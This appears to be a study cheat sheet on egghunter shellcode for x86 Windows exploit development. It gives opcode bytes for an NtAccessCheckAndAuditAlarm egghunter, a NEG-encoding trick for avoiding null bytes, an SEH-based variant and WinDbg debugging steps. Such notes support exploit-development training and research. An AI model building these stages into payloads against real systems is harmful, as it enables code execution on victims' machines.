# Egghunter Quick Reference (x86 Windows)

## 1. Tag Setup
- Tag must be 4 bytes
- Appears twice in memory

Example:
    tag = b"w00t"
    payload = tag + tag + shellcode

---

## 2. NtAccess Egghunter (Primary)

### Use When
- Syscall known
- No badchar issues
- Need smallest payload (~32 bytes)

### Template (dynamic syscall)
66 81 CA FF 0F      or dx,0xfff
42                  inc edx
52                  push edx
6A XX               push syscall
58                  pop eax
CD 2E               int 0x2e
3C 05               cmp al,5
5A                  pop edx
74 EF               je short
B8 77 30 30 74      mov eax,"w00t"
89 D7               mov edi,edx
AF                  scasd
75 EA               jne
AF                  scasd
75 E7               jne
FF E7               jmp edi

---

## 3. Win10 Fix (NEG Encoding)

Problem:
    syscall > 0x7F → NULL bytes

Fix:
    mov eax, negative(syscall)
    neg eax

Example (0x1C6):
    B8 3A FE FF FF   mov eax,0xfffffe3a
    F7 D8            neg eax

---

## 4. SEH Egghunter (Fallback)

### Use When
- Syscalls fail
- Badchars block encoding
- Unknown OS version

### Characteristics
- ~60 bytes
- No syscall dependency
- Uses exception handling

---

## 5. WinDbg Workflow

### Find syscall
    u ntdll!NtAccessCheckAndAuditAlarm
    → mov eax,XXXX

### Set breakpoint
    bp <int 2e addr>

### Step
    t / p

### Validate
    cmp al,5 works
    EDI → tag

---

## 6. Success Condition

    EIP → jmp edi
    EDI → w00tw00t


### SEH egghunter concept

Instead of checking memory:

    trigger exception on invalid access

Mechanism:

    invalid memory → exception → custom SEH handler

Handler:
    - receives CONTEXT structure
    - modifies EIP to skip bad page
    - returns ExceptionContinueExecution

Key instruction:
    add [context + 0xb8], offset

Result:
    execution resumes safely on next page